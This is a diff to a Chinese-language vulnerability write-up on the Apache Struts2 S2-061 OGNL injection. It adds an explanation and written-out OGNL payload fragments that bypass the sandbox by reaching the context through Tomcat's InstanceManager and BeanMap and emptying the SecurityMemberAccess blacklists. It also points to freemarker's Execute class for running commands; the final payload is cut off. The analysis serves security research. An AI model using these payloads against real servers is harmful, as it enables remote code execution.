@@ -1505,10 +1505,59 @@ Struts2 `2.5.22`版本并没有对漏洞点进行修复，而是在`2.5.20`版�
 
 ## 可回显PoC
 
+由于沙盒的增强，我们无法像之前一样轻易的获取上下文对象`context`：
+- `OgnlContext`删除了`CONTEXT_CONTEXT_KEY`这个`key`，故无法通过`OgnlContext#get()`方法，即通过`#context`获取上下文对象;
+- 包名黑名单中包含`com.opensymphony.xwork2.ognl.`，故无法通过`#request['struts.valueStack'].context`或`attr['struts.valueStack'].context`获取上下文对象。
+- 包名黑名单中包含`ognl.`，且`OgnlRuntime`类引入了沙盒保护，因此如果即使获得上下文对象`context`，也无法通过OGNL表达式直接操作它的属性和方法，只能通过间接的方式。
+
+因此只能通过调试看看上下文对象`OgnlContext`中还有什么其他可利用的对象，来间接获取上下文对象。
+这里使用`#application`来获取`OgnlContext`内部`Map`集合中的`ApplicationMap`对象。`ApplicationMap`内部存放了整个应用实例的一些对象，比如这里通过键`org.apache.tomcat.InstanceManager`来获取Tomcat中的`DefaultInstanceManager`对象。
+
+<img src="pic/struts2_s2-061_4.png">
+
+可使用`DefaultInstanceManager#newInstance()`方法，指定类名，来实例化任意对象，但前提是指定的类需要有无参构造方法。
+
+然后使用该方法来创建类`org.apache.commons.collections.BeanMap`的实例对象，然后通过`BeanMap`的`setBean/get`方法来间接获取上下文对象`context`。
+
+以下是`BeanMap#setBean()`方法的实现。它会获取指定`bean`对应的类的所有读写(`setter/getter`)方法，并保存在内部的`HashMap`集合中。另外，每次调用`setBean()`方法，原本存放读写(`setter/getter`)方法的内部`HashMap`集合都会被清空。
+
+<img src="pic/struts2_s2-061_5.png">
+       
+<img src="pic/struts2_s2-061_6.png">
+       
+<img src="pic/struts2_s2-061_7.png">
+
+而`BeanMap#get()`则是获取当前`bean`的指定的`getter`方法。
+
+到此便可使用以下表达式获取上下文对象`context`：
+```
+(#instancemanager=#application['org.apache.tomcat.InstanceManager']).
+(#stack=#request['struts.valueStack']).
+(#bean=#instancemanager.newInstance('org.apache.commons.collections.BeanMap')).
+(#bean.setBean(#stack)).
+(#context=#bean.get('context'))
+```
+
+然后使用同样的方式来获取上下文`context`对象中的安全管理器对象`SecurityMemberAccess`，即安全沙盒的主要实现类。并使用`BeanMap#put()`方法实现黑名单的置空操作。即：
+```
+(#macc=#bean.get('memberAccess')).
+(#bean.setBean(#macc)).
+(#emptyset=#instancemanager.newInstance('java.util.HashSet')).
+(#bean.put('excludedClasses',#emptyset)).
+(#bean.put('excludedPackageNames',#emptyset))
+```
+
+到此，便实现了绕过沙盒，获取了上下文对象`context`，并将沙盒的黑名单指向了一个空的集合。剩下要做的便是执行命令。前面提到过，从`ognl`从`3.1.26`版本开始，增加了`Strict`模式，且是默认启用的。在该模式下，`OgnlRuntime#invokeMethod()`方法还将`java.lang.Runtime`和`java.lang.ProcessBuilder`这两类给ban掉了。这就意味着即使前面绕过了沙盒，最终还是无法在表达式中直接调用这两个类的方法去执行命令。只能通过间接的方式，比如其他某个类的某个方法，里面调用了`Runtime#exec()`或`ProcessBuilder#start()`，且命令参数可控。
+
+`S2-061`的报告者，知名的安全研究员`pwntester`给出了一种方法，就是通过调用`freemarker`中的`freemarker.template.utility.Execute#exec()`实现命令执行。
+
+>估计是他在研究FreeMarker模板注入漏洞及沙盒绕过的时候想到的。详见他的Blackhat议题：<Room for Escape: Scribbling Outside the Lines of Template Security\>(参考[6])
+
+最终可得：
 ```
 %{
 (#instancemanager=#application['org.apache.tomcat.InstanceManager']).
-(#stack=#attr['com.opensymphony.xwork2.util.ValueStack.ValueStack']).
+(#stack=#request['struts.valueStack']).
 (#bean=#instancemanager.newInstance('org.apache.commons.collections.BeanMap')).
 (#bean.setBean(#stack)).
 (#context=#bean.get('context')).
